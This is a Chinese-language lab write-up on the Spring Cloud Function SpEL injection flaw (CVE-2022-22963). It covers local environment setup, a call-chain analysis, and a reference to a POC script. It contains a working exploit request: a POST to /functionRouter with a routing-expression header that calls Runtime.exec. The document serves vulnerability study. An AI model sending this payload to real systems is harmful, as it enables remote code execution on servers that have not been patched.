# SPeL-injection-study（CVE-2022-22963）

共分为环境搭建及漏洞复现、原理学习、POC编写三部分

一、环境搭建

IDEA新建spring initializr


![图片](https://user-images.githubusercontent.com/90664154/164910234-ed150107-3b1f-4ce8-a795-d899224629b0.png)
![图片](https://user-images.githubusercontent.com/90664154/164909361-5067e7e9-1afa-477a-a581-d8811f7b4cb6.png)
![图片](https://user-images.githubusercontent.com/90664154/164909390-ef235ebe-5f69-4004-ac6a-14c1746dd062.png)
这里生成jar包
![图片](https://user-images.githubusercontent.com/90664154/164909399-52db580e-c85e-46aa-96aa-6aa7996a9393.png)

在终端安装jdk11

java -jar jojoSPeL-0.01-SNAPSHOT.jar  部署jar包

![图片](https://user-images.githubusercontent.com/90664154/164909424-929dd7da-900d-44bb-923c-d9d5b22f5f4a.png)

访问127.0.0.1:8080验证
![图片](https://user-images.githubusercontent.com/90664154/164909431-224e18e6-e58e-4613-abd9-84087e0db1f7.png)

发送POC验证
POST /functionRouter HTTP/1.1
Host: 127.0.0.1:8080
spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("calc")
Content-Type: application/x-www-form-urlencoded
Content-Length: 4

jojo

![图片](https://user-images.githubusercontent.com/90664154/164909439-3dd2662e-1eb7-4231-8ec6-95a7f2a262eb.png)

二、漏洞分析

header头的spring.cloud.function.routing-expression参数调用链：
org.springframework.cloud.function.web.mvc.FunctionController中,
body-> processReques(RoutingFunction)-> FunctionInvocationWrapper.apply-> doApply-> RoutingFunction(apply)-> org.springframework.cloud.function.context.config.RoutingFunction(route)-> this.functionFromExpression()，最终执行，这其中的安全过滤函数不充分
![图片](https://user-images.githubusercontent.com/90664154/164909446-6745d62c-4204-4b51-8efe-f792e9893166.png)

三、Poc编写

见附件jojoSPeL.py

![图片](https://user-images.githubusercontent.com/90664154/164909632-7243b33f-bcb2-49b6-8237-a2f7038328b9.png)
